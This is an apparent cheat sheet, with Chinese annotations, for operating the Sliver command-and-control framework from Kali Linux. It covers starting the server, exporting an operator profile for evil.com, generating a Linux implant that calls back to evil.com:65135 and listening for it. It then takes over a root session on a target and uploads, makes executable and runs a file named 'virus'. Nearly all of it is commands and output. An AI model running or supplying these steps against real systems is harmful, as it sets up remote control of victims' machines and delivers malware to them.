Implant framework.

## 1. Install

安装

```
┌──(root㉿kali)-[~]
└─# apt install -y sliver
```

## 2. Init

### 2.1. Server

开机自启

```
┌──(root㉿kali)-[~]
└─$ systemctl enable --now sliver-server.service
```

开放端口用于建立通信

```
┌──(root㉿kali)-[~]
└─$ ufw allow 31337
```

导出配置文件

```
┌──(root㉿kali)-[~]
└─$ sliver-server operator -n nemo -l evil.com -p 31337 -s ~/.sliver
```

### 2.2. Client

导入配置文件

```
┌──(root㉿kali)-[~]
└─$ sliver-client import ~/.sliver/nemo_evil.com.cfg
```

## 3. Usage

运行 Client

```
┌──(root㉿kali)-[~]
└─$ sliver-client
```

退出 Client

```
sliver > exit
```

查看已加入的控制器

```
sliver > operators
```

生成 Implant

```
sliver > generate -o linux -m evil.com:65135
```

监听 Implant

```
sliver > mtls -l 65135
```

查看监听任务

```
sliver > jobs
```

等待目标执行 Implant 后查看会话

```
sliver > sessions

 ID         Transport   Remote Address        Hostname   Username   Operating System   Health
========== =========== ===================== ========== ========== ================== =========
 685a7144   mtls        example.com:32804   morpheus   root       linux/amd64        [ALIVE]
```

进入会话

```
sliver > use  685a7144
```

断开会话

```
[server] sliver (implant) > close
```

上传本地文件到目标

```
[server] sliver (implant) > upload ./virus ./path
```

添加执行权限

```
[server] sliver (implant) > chmod ./virus 755
```

执行程序

```
[server] sliver (implant) > execute ./virus
```

---

References

- [sliver](https://www.kali.org/tools/sliver/)

